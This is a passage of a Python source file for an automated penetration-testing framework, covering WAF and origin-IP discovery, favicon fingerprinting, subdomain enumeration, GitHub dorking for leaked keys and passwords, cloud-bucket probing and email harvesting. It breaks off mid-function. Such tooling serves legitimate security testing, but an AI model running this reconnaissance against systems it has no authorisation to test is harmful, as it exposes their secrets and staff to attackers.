#!/usr/bin/env python3
"""
OMNISCIENCE — Automated Penetration Testing Engine v6.1 (Fixed)
Multi-stage VAPT framework: Telegram → GitHub Actions → Cloudflare Workers → GAS → Google Docs/Drive/Sheets
"""

import os
import sys
import re
import json
import time
import hashlib
import base64
import ipaddress
import urllib.parse
import subprocess
import tempfile
import shutil
import csv
import io
import random
import string
import struct
import socket
import ssl
import logging
import dns.resolver
import dns.zone
import dns.query
import dns.name
from datetime import datetime, timezone
from typing import List, Dict, Optional, Tuple, Any, Set, ClassVar
from collections import defaultdict, Counter          # FIX: Counter was missing
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs, urlencode

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# AI Analysis
import google.generativeai as genai

# Optional imports with graceful fallbacks
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

try:
    import mmh3
    MMH3_AVAILABLE = True
except ImportError:
    MMH3_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from shodan import Shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    from censys.search import CensysHosts
    CENSYS_AVAILABLE = True
except ImportError:
    CENSYS_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import OpenSSL
    OPENSSL_AVAILABLE = True
except ImportError:
    OPENSSL_AVAILABLE = False

try:
    from idna import decode as idna_decode, encode as idna_encode
    IDNA_AVAILABLE = True
except ImportError:
    IDNA_AVAILABLE = False

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

class Config:
    """Central configuration for OMNISCIENCE engine."""

    # Single Gemini key (primary) + multi-key list for rotation
    GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "")
    GEMINI_API_KEYS: ClassVar[List[str]] = [
        k for k in [
            os.environ.get("GEMINI_API_KEY_1", os.environ.get("GEMINI_API_KEY", "")),
            os.environ.get("GEMINI_API_KEY_2", ""),
            os.environ.get("GEMINI_API_KEY_3", ""),
            os.environ.get("GEMINI_API_KEY_4", ""),
            os.environ.get("GEMINI_API_KEY_5", ""),
            os.environ.get("GEMINI_API_KEY_6", ""),
        ] if k
    ]

    SHODAN_API_KEY           = os.environ.get("SHODAN_API_KEY", "")
    CENSYS_API_ID            = os.environ.get("CENSYS_API_ID", "")
    CENSYS_API_SECRET        = os.environ.get("CENSYS_API_SECRET", "")
    GITHUB_TOKEN             = os.environ.get("GITHUB_TOKEN", "")
    TELEGRAM_BOT_TOKEN       = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    TELEGRAM_CHAT_ID         = os.environ.get("TELEGRAM_CHAT_ID", "")
    VIRUSTOTAL_API_KEY       = os.environ.get("VIRUSTOTAL_API_KEY", "")
    SECURITYTRAILS_API_KEY   = os.environ.get("SECURITYTRAILS_API_KEY", "")
    WHOISXML_API_KEY         = os.environ.get("WHOISXML_API_KEY", "")
    ABSTRACT_API_KEY         = os.environ.get("ABSTRACT_API_KEY", "")

    # FIX: added CALLBACK_URL and CHAT_ID aliases used by ScanOrchestrator
    CALLBACK_URL  = os.environ.get("CLOUDFLARE_WORKER_URL", "")
    CHAT_ID       = os.environ.get("TELEGRAM_CHAT_ID", "")
    CLOUDFLARE_WORKER_URL = os.environ.get("CLOUDFLARE_WORKER_URL", "")

    FALSE_PATTERNS_RAW = os.environ.get("FALSE_PATTERNS", "")
    FALSE_PATTERNS: ClassVar[List[str]] = [
        p.strip().lower() for p in FALSE_PATTERNS_RAW.split(",") if p.strip()
    ]
    # FIX: alias used by ScanOrchestrator
    FALSE_POSITIVES = FALSE_PATTERNS

    TARGET      = os.environ.get("TARGET", "")
    TARGET_NAME = os.environ.get("TARGET_NAME", "")

    THREADS = max(3, min(int(os.environ.get("THREADS", "5")), (os.cpu_count() or 2) * 2))
    TIMEOUT             = int(os.environ.get("TIMEOUT", "15"))
    MAX_RETRIES         = int(os.environ.get("MAX_RETRIES", "3"))
    RATE_LIMIT_DELAY    = float(os.environ.get("RATE_LIMIT_DELAY", "0.5"))
    SCAN_ALL_PORTS      = os.environ.get("SCAN_ALL_PORTS", "false").lower() == "true"
    PORT_SCAN_RANGE     = os.environ.get(
        "PORT_SCAN_RANGE",
        "1-65535" if os.environ.get("SCAN_ALL_PORTS", "false").lower() == "true"
        else "80,443,8080,8443,22,21,25,53,110,143,389,445,3389,5900,6379,27017,3306,5432,9200,11211,1883,8883"
    )
    DEEP_SCAN           = os.environ.get("DEEP_SCAN", "false").lower() == "true"
    RECURSIVE_DEPTH     = int(os.environ.get("RECURSIVE_DEPTH", "2"))
    JS_DEEP_ANALYSIS    = os.environ.get("JS_DEEP_ANALYSIS", "true").lower() == "true"
    FAVICON_ANALYSIS    = os.environ.get("FAVICON_ANALYSIS", "true").lower() == "true"
    CORS_DEEP_SCAN      = os.environ.get("CORS_DEEP_SCAN", "true").lower() == "true"
    WAF_DETECTION       = os.environ.get("WAF_DETECTION", "true").lower() == "true"
    WEBSOCKET_SCAN      = os.environ.get("WEBSOCKET_SCAN", "true").lower() == "true"
    API_DISCOVERY       = os.environ.get("API_DISCOVERY", "true").lower() == "true"
    JWT_TESTING         = os.environ.get("JWT_TESTING", "true").lower() == "true"
    GRAPHQL_TESTING     = os.environ.get("GRAPHQL_TESTING", "true").lower() == "true"
    SSTI_TESTING        = os.environ.get("SSTI_TESTING", "true").lower() == "true"
    SSRF_TESTING        = os.environ.get("SSRF_TESTING", "true").lower() == "true"
    CLOUD_ENUM          = os.environ.get("CLOUD_ENUM", "true").lower() == "true"
    HOMOGRAPH_DETECT    = os.environ.get("HOMOGRAPH_DETECT", "true").lower() == "true"
    OSINT_DEEP          = os.environ.get("OSINT_DEEP", "true").lower() == "true"
    CERTIFICATE_ANALYSIS= os.environ.get("CERTIFICATE_ANALYSIS", "true").lower() == "true"
    RATE_LIMIT_AWARE    = os.environ.get("RATE_LIMIT_AWARE", "true").lower() == "true"

    WORDLIST_DIR        = os.environ.get("WORDLIST_DIR", "/usr/share/wordlists")
    DIRBUSTER_WORDLIST  = os.environ.get("DIRBUSTER_WORDLIST", "/usr/share/wordlists/dirb/common.txt")
    SUBDOMAIN_WORDLIST  = os.environ.get("SUBDOMAIN_WORDLIST", "/usr/share/wordlists/subdomains.txt")

    MAX_SCREENSHOTS   = int(os.environ.get("MAX_SCREENSHOTS", "5"))
    SCREENSHOT_WIDTH  = int(os.environ.get("SCREENSHOT_WIDTH", "1280"))
    SCREENSHOT_HEIGHT = int(os.environ.get("SCREENSHOT_HEIGHT", "720"))

    @classmethod
    def is_configured(cls) -> bool:
        return bool(cls.TARGET and cls.GEMINI_API_KEYS and cls.CLOUDFLARE_WORKER_URL)


# ═══════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════

# FIX: moved constant out of method where it was wrongly placed
_MAX_RESPONSE_SIZE = 5 * 1024 * 1024


class Utils:
    """Shared utility functions."""

    @staticmethod
    def get_session(retries: int = 3, backoff: float = 0.5) -> requests.Session:
        session = requests.Session()
        retry_strategy = Retry(
            total=retries,
            backoff_factor=backoff,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=50, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        return session

    @staticmethod
    def safe_request(method: str, url: str, session: requests.Session = None, **kwargs):
        """Make an HTTP request with error handling and rate limiting."""
        # FIX: all logic is now properly indented inside the method
        if Config.RATE_LIMIT_AWARE:
            time.sleep(Config.RATE_LIMIT_DELAY + random.uniform(0, 0.3))

        close_session = False
        if session is None:
            session = Utils.get_session()
            close_session = True

        try:
            kwargs.setdefault("timeout", Config.TIMEOUT)
            kwargs.setdefault("allow_redirects", True)
            kwargs.setdefault("verify", False)
            resp = session.request(method, url, **kwargs)

            # FIX: content-length guard now correctly inside try block
            content_length = int(resp.headers.get("Content-Length", 0))
            if content_length > _MAX_RESPONSE_SIZE:
                return None
            if len(resp.content) > _MAX_RESPONSE_SIZE:
                return None

            return resp

        except requests.exceptions.SSLError:
            return None
        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.ConnectionError:
            return None
        except requests.exceptions.RequestException:
            return None
        except Exception:
            return None
        finally:
            if close_session:
                session.close()

    @staticmethod
    def get(url: str, **kwargs):
        return Utils.safe_request("GET", url, **kwargs)

    @staticmethod
    def post(url: str, **kwargs):
        return Utils.safe_request("POST", url, **kwargs)

    @staticmethod
    def head(url: str, **kwargs):
        return Utils.safe_request("HEAD", url, **kwargs)

    @staticmethod
    def options_request(url: str, **kwargs):
        return Utils.safe_request("OPTIONS", url, **kwargs)

    @staticmethod
    def is_false_positive(text: str) -> bool:
        if not Config.FALSE_PATTERNS:
            return False
        text_lower = text.lower()
        return any(pattern in text_lower for pattern in Config.FALSE_PATTERNS)

    @staticmethod
    def normalize_url(url_str: str) -> str:
        url_str = url_str.strip()
        if not url_str.startswith(("http://", "https://")):
            url_str = f"https://{url_str}"
        parsed = urlparse(url_str)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"

    @staticmethod
    def is_valid_domain(domain: str) -> bool:
        pattern = re.compile(
            r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
        )
        return bool(pattern.match(domain))

    @staticmethod
    def extract_domain(url_str: str) -> str:
        parsed = urlparse(Utils.normalize_url(url_str))
        return parsed.netloc

    @staticmethod
    def run_command(cmd: List[str], timeout: int = 120, cwd: str = None) -> Tuple[str, str, int]:
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout,
                cwd=cwd, env={**os.environ, "PYTHONUNBUFFERED": "1"}
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "TIMEOUT", -1
        except FileNotFoundError:
            return "", f"Command not found: {cmd[0]}", -1
        except Exception as e:
            return "", str(e), -1

    @staticmethod
    def chunk_list(lst: List, chunk_size: int) -> List[List]:
        return [lst[i:i + chunk_size] for i in range(0, len(lst), chunk_size)]

    @staticmethod
    def is_alive(url: str) -> bool:
        try:
            resp = Utils.head(url)
            return resp is not None and resp.status_code < 500
        except Exception:
            return False

    @staticmethod
    def hash_text(text: str) -> str:
        return hashlib.sha256(text.encode()).hexdigest()[:16]

    @staticmethod
    def extract_tech_stack(headers: Dict, body: str = "") -> List[str]:
        tech = []
        headers_lower = {k.lower(): v for k, v in headers.items()}
        server = headers_lower.get("server", "")
        if server:
            tech.append(f"Server:{server}")
        powered = headers_lower.get("x-powered-by", "")
        if powered:
            tech.append(f"PoweredBy:{powered}")
        set_cookie = headers_lower.get("set-cookie", "")
        if "PHPSESSID" in set_cookie:
            tech.append("PHP")
        if "JSESSIONID" in set_cookie:
            tech.append("Java/J2EE")
        if "ASP.NET_SessionId" in set_cookie or "ASPSESSIONID" in set_cookie:
            tech.append("ASP.NET")
        if "CFID" in set_cookie and "CFTOKEN" in set_cookie:
            tech.append("ColdFusion")
        if body:
            if "wp-content" in body or "wp-includes" in body:
                tech.append("WordPress")
            if "csrf-token" in body and "django" in body.lower():
                tech.append("Django")
            if "laravel" in body.lower():
                tech.append("Laravel")
            if "ng-app" in body or "angular" in body.lower():
                tech.append("AngularJS")
            if "react" in body.lower():
                tech.append("React")
            if "vue" in body.lower():
                tech.append("Vue.js")
            if "graphql" in body.lower():
                tech.append("GraphQL")
            if "swagger" in body.lower() or "openapi" in body.lower():
                tech.append("Swagger/OpenAPI")
        if headers_lower.get("cf-ray", ""):
            tech.append("Cloudflare")
        if headers_lower.get("x-akamai-transformed", ""):
            tech.append("Akamai")
        if headers_lower.get("x-fastly-request-id", ""):
            tech.append("Fastly")
        if headers_lower.get("strict-transport-security", ""):
            tech.append("HSTS")
        if headers_lower.get("content-security-policy", ""):
            tech.append("CSP")
        return list(set(tech))


# ═══════════════════════════════════════════════════════════════════════
# STAGE 0: WAF DETECTION & BYPASS
# ═══════════════════════════════════════════════════════════════════════

class WAFDetector:
    WAF_SIGNATURES = {
        "Cloudflare": [("server", "cloudflare"), ("cf-ray", ""), ("cf-cache-status", "")],
        "Akamai": [("server", "akamai"), ("x-akamai-transformed", "")],
        "AWS WAF": [("x-amzn-trace-id", ""), ("x-amz-cf-id", "")],
        "F5 BIG-IP ASM": [("x-asm-version", ""), ("x-wa-info", "")],
        "Imperva/Incapsula": [("x-iinfo", ""), ("x-cdn", "incapsula")],
        "ModSecurity": [("server", "mod_security"), ("server", "modsecurity")],
        "Sucuri": [("x-sucuri-id", ""), ("x-sucuri-cache", "")],
        "Barracuda": [("x-barracuda", "")],
        "Citrix Netscaler": [("x-netscaler", "")],
        "Radware": [("x-rdwr", "")],
        "Fortinet FortiWeb": [("x-fortitech", "")],
        "Varnish": [("via", "varnish"), ("x-varnish", "")],
    }

    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()
        self.detected_wafs: List[str] = []
        self.origin_ips: List[str] = []

    def detect(self) -> Dict:
        result = {
            "waf_detected": False, "waf_names": [], "waf_signatures": [],
            "origin_ips": [], "bypass_suggestions": [], "details": ""
        }
        resp = Utils.get(self.target, session=self.session)
        if not resp:
            return result

        for waf_name, signatures in self.WAF_SIGNATURES.items():
            for sig_type, sig_value in signatures:
                found = False
                for header_key, header_val in resp.headers.items():
                    if sig_type.lower() == header_key.lower():
                        if not sig_value or sig_value.lower() in header_val.lower():
                            found = True
                            break
                if found:
                    self.detected_wafs.append(waf_name)
                    result["waf_names"].append(waf_name)
                    result["waf_signatures"].append(f"{sig_type}: {sig_value}")
                    break

        if self.detected_wafs:
            result["waf_detected"] = True
            result["details"] += f"Detected WAF(s): {', '.join(self.detected_wafs)}\n"

        result["origin_ips"] = self._find_origin_ips()
        result["details"] += f"Origin IPs found: {len(self.origin_ips)}\n"
        return result

    def _find_origin_ips(self) -> List[str]:
        found_ips: List[str] = []
        bypass_subdomains = [
            f"direct.{self.domain}", f"ftp.{self.domain}", f"mail.{self.domain}",
            f"cpanel.{self.domain}", f"origin.{self.domain}", f"api.{self.domain}",
            f"www.{self.domain}", f"m.{self.domain}",
        ]
        for sub in bypass_subdomains:
            try:
                ip = socket.gethostbyname(sub)
                if ip and not ip.startswith(("127.", "10.", "172.16.", "192.168.")):
                    entry = f"{sub} -> {ip}"
                    if entry not in found_ips:
                        found_ips.append(entry)
            except Exception:
                continue

        if Config.SECURITYTRAILS_API_KEY:
            try:
                resp = Utils.get(
                    f"https://api.securitytrails.com/v1/history/{self.domain}/dns/a",
                    headers={"APIKEY": Config.SECURITYTRAILS_API_KEY}, timeout=10
                )
                if resp and resp.status_code == 200:
                    for record in resp.json().get("records", []):
                        ip = record.get("value", {}).get("ip", "")
                        if ip:
                            found_ips.append(f"historical({record.get('date','')}) -> {ip}")
            except Exception:
                pass

        self.origin_ips = found_ips
        return found_ips


# ═══════════════════════════════════════════════════════════════════════
# STAGE 0.5: FAVICON ANALYSIS
# ═══════════════════════════════════════════════════════════════════════

class FaviconAnalyzer:
    KNOWN_FAVICON_HASHES = {
        -335242539: "F5 BIG-IP Load Balancer",
        -157497014: "Joomla!",
        -2135694421: "WordPress",
        208007969: "Drupal",
        1411131163: "Shopify",
        -759984199: "Atlassian Jira",
        161914507: "Atlassian Confluence",
        -329070762: "GitLab",
        373521798: "GitHub",
        641187111: "Jenkins",
        880793428: "Grafana",
        51912266: "PHPMyAdmin",
    }

    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()
        self.favicon_urls: List[str] = []
        self.hashes: Dict[str, int] = {}
        self.technologies: List[str] = []

    def analyze(self) -> Dict:
        result = {
            "favicons_found": 0, "favicon_urls": [], "hashes": {},
            "technologies": [], "shodan_dorks": [], "potential_origin_ips": [], "details": ""
        }
        if not Config.FAVICON_ANALYSIS or not MMH3_AVAILABLE:
            result["details"] = "Favicon analysis skipped"
            return result

        self._discover_favicons()
        for fav_url in self.favicon_urls:
            fav_hash = self._calculate_hash(fav_url)
            if fav_hash is not None:
                self.hashes[fav_url] = fav_hash
                if fav_hash in self.KNOWN_FAVICON_HASHES:
                    tech = self.KNOWN_FAVICON_HASHES[fav_hash]
                    self.technologies.append(tech)
                    result["technologies"].append(f"{tech} (hash: {fav_hash})")
                result["shodan_dorks"].append(f"http.favicon.hash:{fav_hash}")

        result["favicons_found"] = len(self.favicon_urls)
        result["favicon_urls"] = self.favicon_urls
        result["hashes"] = self.hashes
        return result

    def _discover_favicons(self):
        self.favicon_urls.append(urljoin(self.target, "/favicon.ico"))
        resp = Utils.get(self.target, session=self.session)
        if resp and resp.text and BS4_AVAILABLE:
            soup = BeautifulSoup(resp.text, 'html.parser')
            for link in soup.find_all('link', rel=True):
                rel_val = " ".join(link.get('rel', [])).lower()
                if 'icon' in rel_val or 'shortcut' in rel_val:
                    href = link.get('href', '')
                    if href:
                        full_url = urljoin(self.target, href)
                        if full_url not in self.favicon_urls:
                            self.favicon_urls.append(full_url)

    def _calculate_hash(self, favicon_url: str) -> Optional[int]:
        try:
            resp = Utils.get(favicon_url, session=self.session, timeout=10)
            if resp and resp.status_code == 200 and len(resp.content) > 0:
                b64 = base64.b64encode(resp.content).decode('utf-8')
                with_newlines = re.sub("(.{76}|$)", "\\1\n", b64, 0, re.DOTALL)
                return mmh3.hash(with_newlines)
        except Exception:
            pass
        return None


# ═══════════════════════════════════════════════════════════════════════
# STAGE 1: RECONNAISSANCE
# ═══════════════════════════════════════════════════════════════════════

class ReconEngine:
    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()
        self.subdomains: Set[str] = set()
        self.ips: Dict[str, str] = {}
        self.cnames: Dict[str, str] = {}
        self.dns_records: Dict[str, List[str]] = {
            "A": [], "AAAA": [], "CNAME": [], "MX": [], "NS": [], "TXT": [], "SOA": []
        }
        self.wildcard_detected = False

    def run_full_recon(self) -> Dict:
        """FIX: renamed from run() to match ScanOrchestrator call."""
        result = {
            "domain": self.domain,
            "subdomains_found": 0,
            "subdomains": [],
            "dns_records": {},
            "ip_mappings": {},
            "cname_mappings": {},
            "wildcard_detected": False,
            "technologies": [],
            "findings": [],
            "details": ""
        }

        detail_lines = [f"=== RECONNAISSANCE for {self.domain} ==="]

        crt_subs  = self._crt_sh_enum()
        detail_lines.append(f"crt.sh: {len(crt_subs)} subdomains")

        ht_subs   = self._hackertarget_enum()
        detail_lines.append(f"hackertarget: {len(ht_subs)} subdomains")

        if Config.SECURITYTRAILS_API_KEY:
            st_subs = self._securitytrails_enum()
            detail_lines.append(f"securitytrails: {len(st_subs)} subdomains")
        else:
            st_subs = set()

        gd_subs   = self._google_dork_subdomains()
        detail_lines.append(f"public sources: {len(gd_subs)} subdomains")

        if Config.SUBDOMAIN_WORDLIST and os.path.exists(Config.SUBDOMAIN_WORDLIST):
            bf_subs = self._dns_bruteforce()
            detail_lines.append(f"dns brute force: {len(bf_subs)} subdomains")
        else:
            bf_subs = set()
            detail_lines.append("dns brute force: skipped (wordlist not found)")

        self._dns_enumeration()
        self._check_wildcard()

        all_subs = crt_subs | ht_subs | st_subs | gd_subs | bf_subs
        self.subdomains = all_subs

        for sub in list(all_subs)[:500]:
            try:
                ip = socket.gethostbyname(sub)
                self.ips[sub] = ip
            except Exception:
                pass
            try:
                answers = dns.resolver.resolve(sub, 'CNAME', lifetime=5)
                for ans in answers:
                    self.cnames[sub] = str(ans.target).rstrip('.')
            except Exception:
                pass

        result["subdomains_found"] = len(all_subs)
        result["subdomains"] = sorted(all_subs)[:200]
        result["dns_records"] = {k: v[:20] for k, v in self.dns_records.items() if v}
        result["ip_mappings"] = dict(list(self.ips.items())[:100])
        result["cname_mappings"] = dict(list(self.cnames.items())[:50])
        result["wildcard_detected"] = self.wildcard_detected
        result["details"] = "\n".join(detail_lines)
        return result

    def _crt_sh_enum(self) -> Set[str]:
        subs: Set[str] = set()
        try:
            resp = Utils.get(f"https://crt.sh/?q=%25.{self.domain}&output=json", timeout=30)
            if resp and resp.status_code == 200:
                for entry in resp.json():
                    name = entry.get("name_value", "")
                    for n in name.split("\n"):
                        n = n.strip().lower()
                        if n.startswith("*."):
                            n = n[2:]
                        if n.endswith(f".{self.domain}") or n == self.domain:
                            if Utils.is_valid_domain(n):
                                subs.add(n)
        except Exception:
            pass
        return subs

    def _hackertarget_enum(self) -> Set[str]:
        subs: Set[str] = set()
        try:
            resp = Utils.get(f"https://api.hackertarget.com/hostsearch/?q={self.domain}", timeout=30)
            if resp and resp.status_code == 200:
                for line in resp.text.strip().split("\n"):
                    parts = line.split(",")
                    if parts:
                        sub = parts[0].strip().lower()
                        if (sub.endswith(f".{self.domain}") or sub == self.domain) and Utils.is_valid_domain(sub):
                            subs.add(sub)
        except Exception:
            pass
        return subs

    def _securitytrails_enum(self) -> Set[str]:
        subs: Set[str] = set()
        try:
            resp = Utils.get(
                f"https://api.securitytrails.com/v1/domain/{self.domain}/subdomains",
                headers={"APIKEY": Config.SECURITYTRAILS_API_KEY}, timeout=15
            )
            if resp and resp.status_code == 200:
                for sub in resp.json().get("subdomains", []):
                    full = f"{sub}.{self.domain}".lower()
                    if Utils.is_valid_domain(full):
                        subs.add(full)
        except Exception:
            pass
        return subs

    def _google_dork_subdomains(self) -> Set[str]:
        subs: Set[str] = set()
        # AlienVault OTX
        try:
            resp = Utils.get(
                f"https://otx.alienvault.com/api/v1/indicators/domain/{self.domain}/passive_dns",
                timeout=15
            )
            if resp and resp.status_code == 200:
                for entry in resp.json().get("passive_dns", []):
                    sub = entry.get("hostname", "").strip().lower()
                    if sub and (sub.endswith(f".{self.domain}") or sub == self.domain):
                        if Utils.is_valid_domain(sub):
                            subs.add(sub)
        except Exception:
            pass
        return subs

    def _dns_bruteforce(self) -> Set[str]:
        subs: Set[str] = set()
        words = []
        try:
            with open(Config.SUBDOMAIN_WORDLIST, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip().lower() for line in f if line.strip()]
        except Exception:
            words = [
                "www", "mail", "ftp", "admin", "api", "dev", "test", "stage", "blog",
                "cdn", "static", "img", "assets", "portal", "vpn", "webmail",
                "cpanel", "ns1", "ns2", "app", "m", "mobile", "shop", "docs", "wiki",
                "git", "jenkins", "grafana", "kibana", "monitor", "dashboard",
                "demo", "beta", "sandbox", "staging", "prod", "backup", "db",
                "redis", "elastic", "auth", "login", "sso", "oauth", "pay",
            ]

        words_set = set(words[:5000])

        def check_subdomain(word: str) -> Optional[str]:
            fqdn = f"{word}.{self.domain}"
            try:
                socket.gethostbyname(fqdn)
                return fqdn
            except Exception:
                return None

        with ThreadPoolExecutor(max_workers=Config.THREADS) as executor:
            futures = {executor.submit(check_subdomain, w): w for w in words_set}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    subs.add(res)

        return subs

    def _dns_enumeration(self):
        for record_type in ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA']:
            try:
                answers = dns.resolver.resolve(self.domain, record_type, lifetime=10)
                for ans in answers:
                    val = str(ans).strip()
                    if val not in self.dns_records[record_type]:
                        self.dns_records[record_type].append(val)
            except Exception:
                pass

    def _check_wildcard(self):
        random_sub = f"{''.join(random.choices(string.ascii_lowercase, k=12))}.{self.domain}"
        try:
            socket.gethostbyname(random_sub)
            self.wildcard_detected = True
        except Exception:
            self.wildcard_detected = False


# ═══════════════════════════════════════════════════════════════════════
# STAGE 2: OSINT
# ═══════════════════════════════════════════════════════════════════════

class OSINTEngine:
    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()

    def run_full_osint(self) -> Dict:
        """FIX: renamed from run() to match ScanOrchestrator call."""
        result = {
            "github_leaks": [], "cloud_assets": [], "whois_info": {},
            "pastebin_leaks": [], "tech_stack": [], "email_addresses": [],
            "social_media": [], "dark_web_mentions": [], "certificate_info": {},
            "findings": [], "leaks": [], "technologies": [], "details": ""
        }
        detail_lines = ["=== OSINT DEEP DIVE ==="]

        github_results = self._github_dorking()
        result["github_leaks"] = github_results
        detail_lines.append(f"GitHub secrets/leaks: {len(github_results)} findings")

        cloud_results = self._cloud_asset_discovery()
        result["cloud_assets"] = cloud_results
        detail_lines.append(f"Cloud assets: {len(cloud_results)} findings")

        whois_data = self._whois_lookup()
        result["whois_info"] = whois_data

        emails = self._email_harvesting()
        result["email_addresses"] = emails[:30]
        detail_lines.append(f"Emails found: {len(emails)}")

        tech = self._tech_fingerprinting()
        result["tech_stack"] = tech
        result["technologies"] = tech
        detail_lines.append(f"Technologies: {', '.join(tech[:10])}")

        cert_info = self._certificate_analysis()
        result["certificate_info"] = cert_info

        pastebin = self._pastebin_search()
        result["pastebin_leaks"] = pastebin

        social = self._social_media_discovery()
        result["social_media"] = social

        dark = self._dark_web_monitoring()
        result["dark_web_mentions"] = dark

        # FIX: aggregate all leak sources into "leaks" key for ScanOrchestrator
        result["leaks"] = github_results + pastebin + dark

        # Convert findings to standard format
        for item in cloud_results:
            if item.get("status") in ("Public/Listable",):
                result["findings"].append({
                    "type": "cloud_exposure",
                    "severity": "high",
                    "description": f"Exposed {item['type']}: {item['url']}",
                    "url": item["url"]
                })

        result["details"] = "\n".join(detail_lines)
        return result

    def _github_dorking(self) -> List[Dict]:
        findings = []
        if not Config.GITHUB_TOKEN:
            return findings
        dork_queries = [
            f'"{self.domain}" "api_key"', f'"{self.domain}" "secret"',
            f'"{self.domain}" "password"', f'"{self.domain}" "token"',
            f'"{self.domain}" "aws_access_key"', f'"{self.domain}" "-----BEGIN"',
            f'"{self.domain}" ".env"', f'"{self.domain}" "firebase"',
        ]
        for query in dork_queries:
            try:
                resp = Utils.get(
                    "https://api.github.com/search/code",
                    params={"q": query, "per_page": 5},
                    headers={"Authorization": f"token {Config.GITHUB_TOKEN}",
                             "Accept": "application/vnd.github.v3+json"},
                    timeout=10
                )
                if resp and resp.status_code == 200:
                    for item in resp.json().get("items", []):
                        finding = {
                            "repo": item.get("repository", {}).get("full_name", ""),
                            "file": item.get("path", ""),
                            "url": item.get("html_url", ""),
                            "query": query
                        }
                        if finding not in findings:
                            findings.append(finding)
            except Exception:
                continue
        return findings

    def _cloud_asset_discovery(self) -> List[Dict]:
        findings = []
        s3_perms = [
            self.domain.replace(".", ""), self.domain.replace(".", "-"),
            f"{self.domain.replace('.', '')}-assets",
            f"{self.domain.replace('.', '')}-backup",
            f"{self.domain.split('.')[0]}-assets",
            f"{self.domain.split('.')[0]}-backup",
        ]
        for bucket in s3_perms:
            url = f"https://{bucket}.s3.amazonaws.com"
            try:
                resp = Utils.get(url, timeout=5)
                if resp and resp.status_code == 200:
                    findings.append({"type": "S3 Bucket", "url": url, "status": "Public/Listable"})
                elif resp and resp.status_code == 403:
                    findings.append({"type": "S3 Bucket", "url": url, "status": "Exists (access denied)"})
            except Exception:
                continue

        for fb_name in [self.domain.replace(".", "-"), self.domain.split(".")[0]]:
            url = f"https://{fb_name}.firebaseio.com/.json"
            try:
                resp = Utils.get(url, timeout=5)
                if resp and resp.status_code != 404:
                    findings.append({"type": "Firebase", "url": url, "status": f"HTTP {resp.status_code}"})
            except Exception:
                continue
        return findings

    def _whois_lookup(self) -> Dict:
        info = {}
        if WHOIS_AVAILABLE:
            try:
                w = whois.whois(self.domain)
                info["registrar"] = w.registrar or "N/A"
                info["creation_date"] = str(w.creation_date or "N/A")
                info["expiration_date"] = str(w.expiration_date or "N/A")
                info["name_servers"] = w.name_servers or []
                info["org"] = w.org or "N/A"
                info["country"] = w.country or "N/A"
                info["emails"] = w.emails or []
            except Exception:
                pass
        return info

    def _email_harvesting(self) -> List[str]:
        emails: Set[str] = set()
        try:
            resp = Utils.get(self.target, timeout=10)
            if resp and resp.text:
                found = re.findall(
                    r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text
                )
                emails.update(e.lower() for e in found)
        except Exception:
            pass
        if WHOIS_AVAILABLE:
            try:
                w = whois.whois(self.domain)
                if w.emails:
                    for e in w.emails:
                        if e and '@' in str(e):
                            emails.add(str(e).lower().strip())
            except Exception:
                pass
        return sorted(emails)

    def _tech_fingerprinting(self) -> List[str]:
        techs: Set[str] = set()
        try:
            resp = Utils.get(self.target, timeout=10)
            if resp:
